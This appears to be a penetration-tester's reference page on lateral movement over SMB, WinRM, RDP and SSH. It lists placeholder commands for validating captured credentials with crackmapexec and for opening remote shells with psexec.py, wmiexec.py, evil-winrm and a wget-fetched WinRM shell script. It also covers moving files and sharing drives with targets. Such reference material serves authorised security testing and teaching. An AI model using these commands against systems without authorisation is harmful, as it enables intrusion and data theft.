# Remote Services

## SMB (Lateral movement)

{% hint style="info" %}
Remember that if we have credentials and we are in an Active Directory environment, we must test if they are valid at LOCAL and DOMAIN level.
{% endhint %}

#### Validate credentials

```bash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}
crackmapexec smb <IP> -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>'  # Way 1 (at domain level)
crackmapexec smb <IP> -u '<USERNAME>' -p '<PASSWORD>' # Way 2 (at domain level)
crackmapexec smb <IP> -u '<USERNAME>' -p '<PASSWORD>' -d WORKGROUP # Way 3 (at local level)
```

{% hint style="warning" %}
Remember that if we only get a "`[+]`", it only means that the credentials are valid but we cannot use psexec.py or other tools to get a shell. This is because we do not have write access to one of the SMB resources. However, if we get a "`[+] ... (Pwn3d!)`", it means that we already have full access.
{% endhint %}

#### Lateral Movement (SMB)

{% tabs %}
{% tab title="psexec.py" %}
```bash
psexec.py WORKGROUP/<USER>:<PASSWORD>@<IP/COMPUTER> # Local
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP/COMPUTER>
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP/COMPUTER> cmd.exe
```
{% endtab %}

{% tab title="wmiexec.py" %}
Requiere SMB (445) y RPC (135):

```bash
wmiexec.py <DOMAIN>/<USERNAME>@<IP/COMPUTER>
```
{% endtab %}

{% tab title="smbexec.py" %}
```bash
smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP/COMPUTER>
```
{% endtab %}

{% tab title="atexec.py" %}
Execute commands via the Task Scheduler (using `\pipe\atsvc` via SMB):

```bash
atexec.py [[DOMAIN/]USERNAME[:PASSWORD]@]<IP/COMPUTER> "command" 
```
{% endtab %}

{% tab title="smbclient" %}
Although smbclient only allows us to interact with shared resources, we can access the `C$` resource, which has the entire file system there.

```bash
smbclient //<IP>/<SHARED> -U '<USER>%<PASSWORD>'
```
{% endtab %}
{% endtabs %}

**INVESTIGATE IF YOU CAN GET A SHELL WITH CRACKMAPEXEC.**

## WinRM/PS Remoting (Lateral Movement)

An alternative to RPC/SMB to connect to a Windows machine is Powershell Remoting, that will allow you to get a Powershell session in the remote machine. The Powershell remoting service listens in the port 5985 and is enabled by default in the Windows Server machines.

You can use Powershell Remoting from Windows by using many [CmdLets and parameters](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.1) available in Powershell. From a Linux machine you can use [evil-winrm](https://github.com/Hackplayers/evil-winrm).

As well as in the RPC/SMB case, you can use a password, a NT hash or a Kerberos ticket to connect to the target machine.

#### Validate credentials

```bash
crackmapexec winrm -u '<USERNAME>' -p '<PASSWORD>'
```

#### Tools

{% tabs %}
{% tab title="evil-winrm" %}
```bash
# Installation:
gem install evil-winrm
# Connect:
evil-winrm -u '<USERNAME>' -p '<PASSWORD>' -i <IP>
evil-winrm -u '<USERNAME>' -p '<PASSWORD>' -i <IP> -S # SSL
evil-winrm -u '<USERNAME>' -p '<PASSWORD>' -i <IP> -k <PRIVATE KEY>.key -c <PUBLIC CERTIFICATE>.cer -S # If certificates are required.
# Download/Upload
download <ABSOLUTE PATH (REMOTE)> <ABSOLUTE PATH (LOCAL)>
upload <ABSOLUTE PATH (LOCAL)> <ABSOLUTE PATH (REMOTE)>
```

{% hint style="info" %}
For the upload/download functions, remember to ALWAYS use ABSOLUTE paths, otherwise it will not work.
{% endhint %}

### Troubleshooting

#### rexml

It may be that there is an error in the rexml. This can be solved by editing the "Gemfile" located in "/usr/share/evil-winrm". In the gem part, we add the following:

```bash
gem 'rexml', '~> 3.2.4'
```

Also consider reinstalling rexml: `gem install rexml`
{% endtab %}

{% tab title="PowerShell" %}
```bash
# With credentials:
$session = New-PSSession -ComputerName <computername or IP> -Authentication Negotiate -Credential <USERNAME>
Enter-PSSession -Session $session
```
{% endtab %}

{% tab title="winrm_shell.rb" %}
#### Installation

```bash
wget https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb
gem install winrm_shell.rb
# Simple use:
ruby winrm_shell.rb
```

{% hint style="info" %}
Don't forget to set the parameters by modifying the code as shown below.
{% endhint %}

#### Set credentials

```ruby
endpoint: 'https://<IP>:<PORT>/wsman', # Change endpoint.
transport: :ssl,
user: '<USERNAME>', # Change username.
password: '<PASSWORD>', # Change password.
```

#### Set certificates

```ruby
endpoint: 'https://<IP>:<PORT>/wsman', # Change endpoint
transport: :ssl,
client_key => '<PUBLIC KEY CERTIFICATE>.key', # Delete user parameter
client_cert => '<PRIVATE KEY CERTIFICATE>.cert', # Delete password parameter
```
{% endtab %}
{% endtabs %}

## RDP (Lateral movement)

{% hint style="warning" %}
Beware of the UAC that degrades the access token! In all the local accounts, the only one we can move laterally is the Administrator account. We cannot do it with an account that is in the **Administrators group** (**local**). We can try to bypass the UAC to make the move. In the domain accounts, all can be moved laterally. If a domain user is a member of the local Administrators group of another system, we can move without any obstacle. It should be noted that if a local user is in the "Remote Desktop Users" group, we can also move laterally.
{% endhint %}

#### Tools

{% tabs %}
{% tab title="remmina" %}
```bash
# Installation:
sudo apt install remmina # Ubuntu/Debian
sudo pacman -S remmina # Arch Linux
```
{% endtab %}

{% tab title="xfreerdp" %}
```bash
xfreerdp /u:<USERNAME> /d:WORKGROUP /p:<PASSWORD> [+clipboard] /v:<IP> # Local
xfreerdp /u:<USERNAME> /d:<DOMAIN> /p:<PASSWORD> [+clipboard] /v:<IP> [/smart-sizing] # Domain
# Sharing at network level, our /tmp directory:
xfreerdp /u:<USERNAME> /p:<PASSWORD> /cert:ignore [+clipboard] /v:<IP> [/dynamic-resolution] /drive:share,/tmp 
```
{% endtab %}

{% tab title="rdesktop" %}
```bash
# Installation:
sudo apt-get install rdesktop # Ubuntu/Debian
sudo pacman -S rdesktop # Arch Linux
# Simple use:
rdesktop <IP> -g 95%
```

We can share a local directory as a mount volume through RDP itself once we connect to the machine:

```bash
rdesktop -g 95% -r disk:tmp=/usr/share/windows-binaries <IP> -u <USERNAME> -p -
```
{% endtab %}
{% endtabs %}

## SSH (Lateral Movement)

```bash
ssh <USERNAME>@<IP> # With password.
sshpass -p '<PASSWORD>' ssh <USERNAME>@<IP>
ssh -i <ID_RSA> <USERNAME>@<IP> # With private key.
```

[Pass-The-Hash](use-alternate-authentication-material/pass-the-hash/ssh-pth.md) can also be performed via SSH.
